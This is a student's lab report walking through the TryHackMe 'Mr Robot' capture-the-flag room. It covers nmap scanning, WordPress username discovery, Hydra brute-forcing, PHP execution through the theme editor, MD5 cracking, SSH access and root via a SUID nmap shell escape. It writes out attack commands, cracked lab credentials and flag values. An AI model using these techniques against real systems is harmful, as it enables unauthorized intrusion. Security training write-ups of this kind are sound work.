

Mr Robot | TryHackMe Lab Report

Difficulty: Medium

# 1. Assessment Scope and Goals

The goal of this exercise was to obtain at least three flags in the assigned CTF environment and record the approach, evidence, and results in line with the Bincom 6th Contact Session assignment.

| Field | Detail |
| --- | --- |
| Target name | Mr Robot CTF (TryHackMe) |
| Target IP (AttackBox) | 10.129.138.192 |
| Target IP (Kali VPN session) | 10.130.138.103 / 10.130.128.16 |
| Attacker platforms | TryHackMe AttackBox (initial); Kali Linux VM via OpenVPN (main) |
| Engagement type | Authorized lab CTF — credited to Leon Johnson, used with creator's permission |
| Flags required | 3 minimum (3 captured) |

# 2. Tools and Their Roles

Nmap — port/service enumeration

curl — HTTP requests, file retrieval, payload triggering

WPScan — WordPress enumeration

Hydra — HTTP form password brute-forcing

WordPress Theme Editor — authenticated RCE vector

Hashcat — MD5 hash cracking (rockyou.txt wordlist)

SSH — remote shell access

# 3. Assessment Workflow

## 3.1 Initial Service Discovery

The first step was a full TCP port scan with Nmap, including default scripts and service-version detection, to map the target's externally reachable services:

nmap -sC -sV -p- 10.129.138.192

The scan returned three accessible services:

| Port | Service / Notes |
| --- | --- |
| 22/tcp | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | Apache httpd (WordPress 4.3.1) |
| 443/tcp | Apache httpd / SSL (self-signed cert, CN=www.example.com) |

The HTTP service presented a Mr Robot-themed WordPress website. Its reported version, WordPress 4.3.1, is obsolete and therefore became the main area for further investigation.

## 3.2 Flag One — Information Exposed by robots.txt

As part of routine web enumeration, the site's robots.txt file was inspected for paths and files that might reveal useful information:

curl http://10.129.138.192/robots.txt

The response listed two resources: fsocity.dic, a sizeable dictionary file, and key-1-of-3.txt, which could be requested directly to retrieve the first flag:

curl http://10.129.138.192/key-1-of-3.txt

| Key 1 Captured: 073403c8a58a1f80d943455fb30724b9 |
| --- |

## 3.3 Identifying a Valid Username

Credential testing required a confirmed account name first. Three automated enumeration approaches were tried, but none identified a user:

WordPress REST API (?rest_route=/wp/v2/users) — endpoint not enabled on this WordPress 4.3.1 instance

?author=1 redirect enumeration — returned 200 OK with no Location header (author archives disabled)

WPScan automated user enumeration (--enumerate u) — returned 'No Users Found' after brute-forcing author IDs 1-10

After the automated checks produced no result, the login form was tested manually with two candidate names. The application returned different messages for an existing username and a nonexistent one:

curl -s -X POST http://10.130.138.103/wp-login.php \
  -d "log=elliot&pwd=wrongpass123&wp-submit=Log+In" | grep -i "error"
# Result: "The password you entered for the username elliot is incorrect"

curl -s -X POST http://10.130.138.103/wp-login.php \
  -d "log=qwertyuiopxyz&pwd=wrongpass123&wp-submit=Log+In" | grep -i "error"
# Result: "Invalid username"

The differing error messages indicated that elliot was a valid username on this installation.

## 3.4 Password Recovery Through Wordlist Testing

The fsocity.dic file contained 858,160 lines. A test against the unprocessed list was estimated to take more than nine hours, so duplicate entries were removed first. This reduced the working list to 11,451 distinct candidates:

curl http://10.130.138.103/fsocity.dic -o fsocity.dic
sort fsocity.dic | uniq > fsocity_clean.dic   # 858,160 → 11,451 unique entries

hydra -l elliot -P fsocity_clean.dic 10.130.138.103 \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered" -t 30

The reduced list produced working WordPress credentials in about five minutes:

| WordPress Credentials: elliot : ER28-0652 |
| --- |

## 3.5 Verifying Administrative Access

The recovered login details opened the WordPress administration area. The dashboard greeting, “Howdy, Elliot Alderson,” confirmed the authenticated account.

## 3.6 Reverse-Shell Attempt Through the Theme Editor

Because the account had administrator privileges, the theme editor was available under Appearance → Editor. The Twenty Fifteen theme's 404.php template was changed to test PHP command execution when a missing page was requested.

Several reverse-shell variants were attempted, including PHP socket/exec, Bash /dev/tcp, and proc_open approaches. The editor accepted the changes without a PHP syntax error, but the netcat listener received no connection on either port 4444 or 443.

A standalone fsockopen() connectivity check, without launching a shell, returned “FAILED: 110 Connection timed out.” This supported the conclusion that outbound TCP traffic from the target to the VPN address was filtered by the lab network, rather than the failure being caused solely by payload syntax.

## 3.7 Alternative Approach — Reading Local Files

With the reverse-shell route unavailable, the same PHP execution point was used for local file inspection. PHP file functions could read accessible paths without needing a new outbound connection.

// Enumerate home directories
print_r(scandir('/home'));
// → robot, ubuntu

// List robot's home directory
print_r(scandir('/home/robot'));
// → key-2-of-3.txt, password.raw-md5

The web-server account could not read key-2-of-3.txt because the file belonged to robot and its permissions did not allow access. The password.raw-md5 file, however, was readable and exposed the stored hash:

file_get_contents('/home/robot/password.raw-md5');
// → robot:c3fcd3d76192e4007dfb496cca67e13b

## 3.8 Recovering the Password from Its Hash

Hashcat was used to compare the recovered MD5 value against entries in the rockyou.txt password list:

echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
hashcat -m 0 -a 0 robot_hash.txt /usr/share/wordlists/rockyou.txt
# → c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

| robot User Credentials: robot : abcdefghijklmnopqrstuvwxyz |
| --- |

## 3.9 Flag Two — Logging in Through SSH

Since SSH had been identified as open during reconnaissance, it provided a direct alternative to the blocked reverse-shell connection. The recovered robot credentials were used to log in:

ssh robot@10.130.128.16
# Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt

| Key 2 Captured: 822c73956184f694993bede3eb39f959 |
| --- |

## 3.10 Escalating from robot to Root

After obtaining a shell as robot, the available sudo permissions were checked. The account was not permitted to run sudo commands:

sudo -l
# → Sorry, user robot may not run sudo on ip-10-130-128-16.

The next check searched the filesystem for SUID executables. Such programs run with the file owner's effective privileges, which can make an incorrectly configured root-owned binary significant:

find / -perm -4000 -type f 2>/dev/null

The scan revealed an unusual SUID-enabled Nmap binary at /usr/local/bin/nmap. Version 3.81 supports interactive mode, including a shell escape; in combination with the SUID permission, this configuration allowed the session to obtain root privileges:

nmap --interactive
nmap> !sh
# whoami → root
cat /root/key-3-of-3.txt

| Key 3 Captured (Root): 04787ddef27c3dee1ee161b21670b4e4 |
| --- |

# 4. Key Findings and Lessons

Username discovery may require more than automated enumeration. The REST API, author-ID checks, and WPScan did not identify the account in this case, while comparing login error messages did. Keep a manual verification method available.

Cleaning a wordlist can substantially reduce testing time. Removing duplicates from fsocity.dic reduced the estimated run from over nine hours to roughly five minutes.

Confirmed code execution does not guarantee a reverse shell. The socket timeout indicated outbound filtering, so switching to local file reads was more productive than continuing to change payloads.

Checking SUID files is a quick way to find privilege-escalation opportunities. Here, a single filesystem search exposed the misconfigured Nmap binary.

Moving from the time-limited AttackBox to a Kali VM over OpenVPN affected the workflow. Recording that environment change makes the methodology reproducible and transparent.

# 5. Conclusion

All three flags were recovered, completing the Mr Robot CTF room. The exercise covered a chain of techniques beginning with unauthenticated service discovery and ending with root access: web reconnaissance, credential testing, authenticated PHP execution, hash recovery, SSH access, and SUID-based privilege escalation.

The most significant operational challenge was a blocked reverse shell channel, which required pivoting from an active exploitation technique (outbound connection) to a passive one (local file read through the same RCE vector), followed by a lateral move to SSH for proper shell access. This kind of mid-engagement pivot is a core skill in real penetration testing, and documenting the failed attempts as well as the successful pivot reflects honest and thorough reporting practice.
